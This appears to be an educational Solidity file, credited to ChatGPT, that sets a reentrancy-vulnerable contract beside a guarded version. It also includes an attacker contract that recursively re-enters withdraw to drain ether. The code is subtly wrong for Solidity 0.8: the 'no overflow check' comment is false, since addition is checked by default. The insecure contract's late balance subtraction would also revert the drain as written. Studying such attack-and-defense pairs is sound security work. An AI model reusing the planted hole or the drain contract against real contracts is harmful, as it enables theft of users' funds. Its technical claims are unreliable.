// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title DefectAttackDefense - Attack and Defense Simulation for Defects in Web3 Smart Contracts
/// @author ChatGPT

/// @notice Insecure Contract with Defects: No Access Control, Vulnerable External Calls, Math Overflow Risk
contract InsecureDefectContract {
    mapping(address => uint256) public balances;
    bool public locked;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // 🔥 Vulnerable to reentrancy
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Withdrawal failed");

        balances[msg.sender] -= amount;
        emit Withdrawal(msg.sender, amount);
    }

    function unsafeAdd(uint256 a, uint256 b) external pure returns (uint256) {
        // 🔥 No overflow check
        return a + b;
    }

    receive() external payable {}
}

/// @notice Secure Contract with Defect Protection: Reentrancy Guard, Strict Access Control, Safe Math Enforcement
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract SecureDefectContract is ReentrancyGuard, Ownable {
    mapping(address => uint256) private balances;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    function deposit() external payable {
        require(msg.value > 0, "No value sent");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) external nonReentrant {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        balances[msg.sender] -= amount;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Withdrawal failed");

        emit Withdrawal(msg.sender, amount);
    }

    function safeAdd(uint256 a, uint256 b) external pure returns (uint256) {
        unchecked {
            uint256 c = a + b;
            require(c >= a, "Overflow detected");
            return c;
        }
    }

    function balanceOf(address user) external view returns (uint256) {
        return balances[user];
    }

    receive() external payable {}
}

/// @notice Reentrancy Intruder trying to exploit vulnerable contract
contract DefectIntruder {
    address public targetInsecure;
    bool public attackTriggered;

    constructor(address _targetInsecure) {
        targetInsecure = _targetInsecure;
    }

    function attack() external payable {
        require(msg.value > 0, "Need ETH to attack");
        (bool success, ) = targetInsecure.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
        require(success, "Deposit failed");

        attackTriggered = true;
        (success, ) = targetInsecure.call(abi.encodeWithSignature("withdraw(uint256)", msg.value));
        require(success, "Withdraw failed");
    }

    receive() external payable {
        if (attackTriggered) {
            (bool success, ) = targetInsecure.call(abi.encodeWithSignature("withdraw(uint256)", 0.01 ether));
            require(success, "Recursive Withdraw failed");
        }
    }
}
